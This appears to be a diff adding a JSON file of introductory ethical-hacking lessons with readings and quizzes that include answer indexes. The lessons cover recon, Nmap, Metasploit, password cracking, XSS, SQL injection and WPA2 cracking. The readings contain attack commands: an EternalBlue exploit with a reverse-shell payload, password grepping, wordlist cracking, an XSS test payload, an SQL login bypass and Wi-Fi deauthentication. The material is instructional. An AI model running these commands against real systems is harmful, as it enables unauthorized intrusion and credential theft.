@@ -1,0 +1,172 @@
+[
+  {
+    "id": 0,
+    "title": "Introduction to Ethical Hacking",
+    "vid": "fNzpcB7iRxo",
+    "reading": "<h3>What is Ethical Hacking?</h3>\n<p>Ethical hacking involves an authorized attempt to gain unauthorized access to a computer system, application, or data. Carrying out an ethical hack involves duplicating strategies and actions of malicious attackers.</p>\n<div class='note-box'>💡 Note: Ethical hackers use their skills to improve security by exposing vulnerabilities before malicious hackers can detect and exploit them. Always get explicit permission before testing!</div>\n<h3>Types of Hackers</h3>\n<ul>\n<li><strong>White Hat:</strong> Security professionals who hack for defense.</li>\n<li><strong>Black Hat:</strong> Malicious hackers who exploit systems for personal gain.</li>\n<li><strong>Grey Hat:</strong> Hackers who operate in a gray area, often without permission but without malicious intent.</li>\n</ul>\n<h3>The Penetration Testing Process</h3>\n<p>Professional penetration testing generally follows a structured methodology:</p>\n<ol>\n<li><strong>Reconnaissance (Footprinting):</strong> Gathering information about the target.</li>\n<li><strong>Scanning:</strong> Identifying open ports, services, and network structure.</li>\n<li><strong>Gaining Access:</strong> Exploiting vulnerabilities to enter the system.</li>\n<li><strong>Maintaining Access:</strong> Creating backdoors for future access.</li>\n<li><strong>Covering Tracks:</strong> Erasing logs and evidence of the breach.</li>\n</ol>\n<p>As an ethical hacker, your final step is usually <strong>Reporting</strong> rather than covering tracks.</p>",
+    "quiz": [
+      {
+        "q": "What is the primary difference between a White Hat and a Black Hat hacker?",
+        "opts": [
+          "Their skill level",
+          "Authorization and intent",
+          "The tools they use"
+        ],
+        "ans": 1
+      }
+    ]
+  },
+  {
+    "id": 1,
+    "title": "Linux & Command Line Basics for Hackers",
+    "vid": "v_1zB2WNN14",
+    "reading": "<h3>Why Linux?</h3>\n<p>Most hacking and penetration testing tools are built natively for Linux. Distributions like <strong>Kali Linux</strong> and <strong>Parrot OS</strong> are considered industry standards for ethical hacking.</p>\n<div class='note-box'>💡 Note: Mastering the Linux Command Line Interface (CLI) is mandatory for any aspiring ethical hacker.</div>\n<h3>Essential Linux Commands</h3>\n<p>Here are some of the most critical commands you'll use on a daily basis:</p>\n<ul>\n<li><code>ls</code> - List directory contents</li>\n<li><code>cd</code> - Change directory</li>\n<li><code>grep</code> - Search text using patterns</li>\n<li><code>cat</code> - Read file contents</li>\n<li><code>chmod</code> - Change file permissions</li>\n</ul>\n<h3>Example: Searching for Sensitive Data</h3>\n<p>You can use the command line to search for specific strings, like 'password', within files:</p>\n<div class='code-block'>grep -r -i \"password\" /var/www/html/</div>\n<p>This command recursively (<code>-r</code>) and case-insensitively (<code>-i</code>) searches for the word \"password\" in the web directory.</p>\n<h3>File Permissions</h3>\n<p>Understanding permissions is crucial for privilege escalation. Linux uses read (r), write (w), and execute (x) permissions for users, groups, and others.</p>\n<div class='code-block'>chmod +x exploit.py</div>\n<p>The command above makes a python script executable.</p>",
+    "quiz": [
+      {
+        "q": "Which command is used to change file permissions in Linux?",
+        "opts": [
+          "chown",
+          "chmod",
+          "chgrp"
+        ],
+        "ans": 1
+      }
+    ]
+  },
+  {
+    "id": 2,
+    "title": "Reconnaissance & Footprinting",
+    "vid": "bK908hEqbGw",
+    "reading": "<h3>What is Reconnaissance?</h3>\n<p>Reconnaissance, or footprinting, is the first phase of ethical hacking. It involves gathering as much information as possible about a target system to find ways to intrude into it.</p>\n<div class='note-box'>💡 Note: Reconnaissance can be Active (interacting directly with the target) or Passive (gathering info without direct interaction).</div>\n<h3>Passive Reconnaissance</h3>\n<p>Passive recon involves using public resources. Tools and techniques include:</p>\n<ul>\n<li><strong>WHOIS Lookups:</strong> To find domain registration details.</li>\n<li><strong>Google Dorks:</strong> Using advanced search operators to find exposed data.</li>\n<li><strong>OSINT (Open Source Intelligence):</strong> Searching social media, public records, and forums.</li>\n</ul>\n<h3>Example: Google Dorking</h3>\n<p>Google dorks can reveal sensitive files that shouldn't be public:</p>\n<div class='code-block'>site:target.com ext:pdf \"confidential\"</div>\n<p>This searches for PDF files containing the word \"confidential\" on the target's website.</p>\n<h3>Active Reconnaissance</h3>\n<p>Active recon involves probing the target's network directly. This leaves traces and should only be done with permission.</p>\n<ul>\n<li><strong>DNS Enumeration:</strong> Finding subdomains and DNS records (e.g., using <code>nslookup</code> or <code>dig</code>).</li>\n<li><strong>Ping Sweeps:</strong> Checking which IP addresses are active.</li>\n</ul>",
+    "quiz": [
+      {
+        "q": "Which of the following is considered Passive Reconnaissance?",
+        "opts": [
+          "Port scanning the target server",
+          "Querying a public WHOIS database",
+          "Performing a ping sweep"
+        ],
+        "ans": 1
+      }
+    ]
+  },
+  {
+    "id": 3,
+    "title": "Network Scanning with Nmap",
+    "vid": "4GcwzomndI0",
+    "reading": "<h3>Introduction to Nmap</h3>\n<p><strong>Nmap (Network Mapper)</strong> is an open-source tool used for network discovery and security auditing. It is the industry standard for port scanning.</p>\n<div class='note-box'>💡 Note: Nmap sends specially crafted packets to the target host and analyzes the responses to determine open ports, running services, and operating systems.</div>\n<h3>Basic Nmap Scans</h3>\n<p>To scan a single IP address or hostname:</p>\n<div class='code-block'>nmap 192.168.1.100</div>\n<h3>Advanced Nmap Commands</h3>\n<p>Nmap has powerful flags to customize your scan:</p>\n<ul>\n<li><code>-sV</code> : Probes open ports to determine service and version info.</li>\n<li><code>-O</code> : Enables OS detection.</li>\n<li><code>-p-</code> : Scans all 65535 ports.</li>\n<li><code>-A</code> : Enables OS detection, version detection, script scanning, and traceroute.</li>\n</ul>\n<h3>Example: Comprehensive Scan</h3>\n<p>A typical scan used by penetration testers to gather detailed information:</p>\n<div class='code-block'>nmap -sC -sV -p- 10.10.10.5</div>\n<p>This command uses default Nmap scripts (<code>-sC</code>), probes for versions (<code>-sV</code>), and scans all ports (<code>-p-</code>) on the target IP.</p>",
+    "quiz": [
+      {
+        "q": "Which Nmap flag is used to determine the versions of running services?",
+        "opts": [
+          "-O",
+          "-sV",
+          "-sS"
+        ],
+        "ans": 1
+      }
+    ]
+  },
+  {
+    "id": 4,
+    "title": "Vulnerability Assessment",
+    "vid": "5z1w3uJ11R4",
+    "reading": "<h3>What is Vulnerability Assessment?</h3>\n<p>Vulnerability assessment is the process of identifying, quantifying, and prioritizing vulnerabilities in a system. It answers the question: \"What are our weaknesses?\"</p>\n<div class='note-box'>💡 Note: While a penetration test involves actively exploiting vulnerabilities, an assessment primarily focuses on identifying them.</div>\n<h3>Common Vulnerability Scanners</h3>\n<p>Automated tools are often used to scan networks for known vulnerabilities:</p>\n<ul>\n<li><strong>Nessus:</strong> One of the most popular commercial vulnerability scanners.</li>\n<li><strong>OpenVAS:</strong> A full-featured open-source vulnerability scanner.</li>\n<li><strong>Nikto:</strong> A command-line web server scanner.</li>\n</ul>\n<h3>Understanding CVSS</h3>\n<p>The <strong>Common Vulnerability Scoring System (CVSS)</strong> provides a way to capture the principal characteristics of a vulnerability and produce a numerical score reflecting its severity (0.0 to 10.0).</p>\n<ul>\n<li><strong>Low:</strong> 0.1 - 3.9</li>\n<li><strong>Medium:</strong> 4.0 - 6.9</li>\n<li><strong>High:</strong> 7.0 - 8.9</li>\n<li><strong>Critical:</strong> 9.0 - 10.0</li>\n</ul>\n<h3>Using SearchSploit</h3>\n<p>If you find a specific service version, you can search for known exploits using the command-line tool <code>searchsploit</code> (an offline copy of Exploit-DB).</p>\n<div class='code-block'>searchsploit Apache 2.4.49</div>",
+    "quiz": [
+      {
+        "q": "What does CVSS stand for in the context of cybersecurity?",
+        "opts": [
+          "Common Vulnerability Scoring System",
+          "Critical Vector Security System",
+          "Computer Virus Surveillance System"
+        ],
+        "ans": 0
+      }
+    ]
+  },
+  {
+    "id": 5,
+    "title": "System Hacking & Metasploit",
+    "vid": "8l1UMBiG6Rg",
+    "reading": "<h3>The Metasploit Framework</h3>\n<p><strong>Metasploit</strong> is an incredibly powerful open-source penetration testing framework used for developing and executing exploit code against a remote target.</p>\n<div class='note-box'>💡 Note: Metasploit contains a massive database of exploits, payloads, encoders, and auxiliary modules.</div>\n<h3>Metasploit Basics</h3>\n<p>To start Metasploit from the Kali Linux terminal, type <code>msfconsole</code>.</p>\n<p>Key Metasploit concepts:</p>\n<ul>\n<li><strong>Exploit:</strong> The code that takes advantage of a vulnerability.</li>\n<li><strong>Payload:</strong> The code that runs on the target system after a successful exploit (e.g., gaining a reverse shell).</li>\n<li><strong>LHOST / RHOST:</strong> Local Host (your IP) and Remote Host (target IP).</li>\n</ul>\n<h3>Example: Exploiting a Vulnerability</h3>\n<p>Here is a typical workflow in <code>msfconsole</code>:</p>\n<div class='code-block'>use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.50\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.10\nexploit</div>\n<h3>Meterpreter Shell</h3>\n<p>If the exploit is successful, you often get a <strong>Meterpreter</strong> session. Meterpreter is an advanced, dynamically extensible payload that provides complex features like keylogging, privilege escalation, and pivoting.</p>",
+    "quiz": [
+      {
+        "q": "In Metasploit, what is the 'Payload'?",
+        "opts": [
+          "The target IP address",
+          "The code that exploits a specific vulnerability",
+          "The code executed on the target after a successful exploit"
+        ],
+        "ans": 2
+      }
+    ]
+  },
+  {
+    "id": 6,
+    "title": "Password Cracking & Privilege Escalation",
+    "vid": "7M1G74x6T7E",
+    "reading": "<h3>Password Cracking Basics</h3>\n<p>Password cracking involves recovering passwords from data that has been stored in or transmitted by a computer system. Attackers typically steal cryptographic hashes and crack them offline.</p>\n<div class='note-box'>💡 Note: Always use strong, complex passwords and multi-factor authentication (MFA) to mitigate password cracking attacks.</div>\n<h3>Types of Attacks</h3>\n<ul>\n<li><strong>Dictionary Attack:</strong> Trying a predefined list of likely passwords (e.g., the <code>rockyou.txt</code> wordlist).</li>\n<li><strong>Brute Force Attack:</strong> Trying every possible combination of characters.</li>\n<li><strong>Rainbow Tables:</strong> Using precomputed tables for reversing cryptographic hash functions.</li>\n</ul>\n<h3>Popular Tools</h3>\n<p><strong>John the Ripper</strong> and <strong>Hashcat</strong> are the most popular offline password crackers.</p>\n<div class='code-block'>john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</div>\n<h3>Privilege Escalation</h3>\n<p>Once an attacker gains initial access (often as a low-privileged user), they will attempt <strong>Privilege Escalation</strong> to gain Administrator or root access.</p>\n<p>Common techniques include:</p>\n<ul>\n<li>Exploiting kernel vulnerabilities.</li>\n<li>Abusing misconfigured file permissions or SUID binaries.</li>\n<li>Finding hardcoded passwords in scripts.</li>\n</ul>",
+    "quiz": [
+      {
+        "q": "Which attack type uses a predefined list of commonly used passwords?",
+        "opts": [
+          "Brute Force Attack",
+          "Rainbow Table Attack",
+          "Dictionary Attack"
+        ],
+        "ans": 2
+      }
+    ]
+  },
+  {
+    "id": 7,
+    "title": "Web Application Hacking",
+    "vid": "2OqisGqPTvk",
+    "reading": "<h3>The OWASP Top 10</h3>\n<p>The <strong>Open Worldwide Application Security Project (OWASP)</strong> Top 10 is a standard awareness document for developers and web application security. It represents a broad consensus about the most critical security risks to web applications.</p>\n<div class='note-box'>💡 Note: Familiarity with the OWASP Top 10 is mandatory for web penetration testers.</div>\n<h3>Cross-Site Scripting (XSS)</h3>\n<p>XSS occurs when an application includes untrusted data in a web page without proper validation or escaping. This allows an attacker to execute malicious scripts in the victim's browser.</p>\n<ul>\n<li><strong>Stored XSS:</strong> The malicious script is permanently stored on the target servers (e.g., in a forum post).</li>\n<li><strong>Reflected XSS:</strong> The malicious script is reflected off a web application onto the victim's browser (often via a crafted URL).</li>\n</ul>\n<h3>Example XSS Payload</h3>\n<p>A basic test payload to see if an input field is vulnerable to XSS:</p>\n<div class='code-block'>&lt;script&gt;alert('XSS Vulnerable!')&lt;/script&gt;</div>\n<h3>Cross-Site Request Forgery (CSRF)</h3>\n<p>CSRF forces an end user to execute unwanted actions on a web application in which they're currently authenticated.</p>",
+    "quiz": [
+      {
+        "q": "Which vulnerability allows an attacker to execute malicious JavaScript in a victim's browser?",
+        "opts": [
+          "SQL Injection",
+          "Cross-Site Scripting (XSS)",
+          "Cross-Site Request Forgery (CSRF)"
+        ],
+        "ans": 1
+      }
+    ]
+  },
+  {
+    "id": 8,
+    "title": "SQL Injection (SQLi)",
+    "vid": "ciNHn38EyRc",
+    "reading": "<h3>What is SQL Injection?</h3>\n<p><strong>SQL Injection (SQLi)</strong> is a code injection technique used to attack data-driven applications. Malicious SQL statements are inserted into entry fields for execution, allowing attackers to view, modify, or delete database data.</p>\n<div class='note-box'>💡 Note: SQLi is one of the oldest, most prevalent, and most dangerous web application vulnerabilities.</div>\n<h3>How SQLi Works</h3>\n<p>Imagine a login query structured like this:</p>\n<div class='code-block'>SELECT * FROM users WHERE username = 'USER_INPUT' AND password = 'PASSWORD_INPUT';</div>\n<p>If an attacker enters <code>admin' --</code> as the username, the query becomes:</p>\n<div class='code-block'>SELECT * FROM users WHERE username = 'admin' --' AND password = 'PASSWORD_INPUT';</div>\n<p>The <code>--</code> comments out the rest of the query, bypassing the password check completely!</p>\n<h3>Types of SQLi</h3>\n<ul>\n<li><strong>In-Band SQLi (Classic):</strong> Data is extracted using the same channel that is used to inject the SQL code.</li>\n<li><strong>Inferential SQLi (Blind):</strong> No data is actually transferred via the web application. The attacker infers the payload's effect by observing the application's behavior.</li>\n</ul>\n<h3>Mitigation</h3>\n<p>The primary defense against SQLi is the use of <strong>Prepared Statements (Parameterized Queries)</strong>, which separate the query structure from the user input.</p>",
+    "quiz": [
+      {
+        "q": "What is the best way for a developer to prevent SQL Injection vulnerabilities?",
+        "opts": [
+          "Using Prepared Statements (Parameterized Queries)",
+          "Hiding the database IP address",
+          "Encrypting passwords in the database"
+        ],
+        "ans": 0
+      }
+    ]
+  },
+  {
+    "id": 9,
+    "title": "Wireless Network Hacking",
+    "vid": "3Kq1MIfIGCE",
+    "reading": "<h3>Wi-Fi Security Protocols</h3>\n<p>Wireless networks have evolved through several security standards:</p>\n<ul>\n<li><strong>WEP:</strong> Old, completely broken, and can be cracked in minutes. Never use it.</li>\n<li><strong>WPA:</strong> Replaced WEP, but has its own vulnerabilities.</li>\n<li><strong>WPA2:</strong> The modern standard. Highly secure if a strong password is used.</li>\n<li><strong>WPA3:</strong> The latest standard, offering robust protection against dictionary attacks.</li>\n</ul>\n<div class='note-box'>💡 Note: To hack wireless networks, a wireless adapter that supports 'Monitor Mode' and 'Packet Injection' is required.</div>\n<h3>Hacking WPA2</h3>\n<p>The most common method to hack a WPA2 network is capturing the <strong>4-Way Handshake</strong>.</p>\n<ol>\n<li>The attacker puts their wireless card into Monitor Mode using tools like <code>airmon-ng</code>.</li>\n<li>They use <code>airodump-ng</code> to listen for traffic on the target network.</li>\n<li>They forcefully disconnect a connected user using a <em>Deauthentication Attack</em> (with <code>aireplay-ng</code>).</li>\n<li>When the user automatically reconnects, the attacker captures the encrypted WPA2 4-Way Handshake.</li>\n<li>The attacker takes the handshake offline and uses tools like Hashcat or John the Ripper to brute-force the password.</li>\n</ol>\n<h3>Example Commands</h3>\n<div class='code-block'>airmon-ng start wlan0\nairodump-ng wlan0mon\naireplay-ng --deauth 10 -a [Router_MAC] wlan0mon</div>",
+    "quiz": [
+      {
+        "q": "What specific Wi-Fi traffic must an attacker capture to crack a WPA2 password offline?",
+        "opts": [
+          "A DHCP Request",
+          "The 4-Way Handshake",
+          "An ARP broadcast"
+        ],
+        "ans": 1
+      }
+    ]
+  }
+]
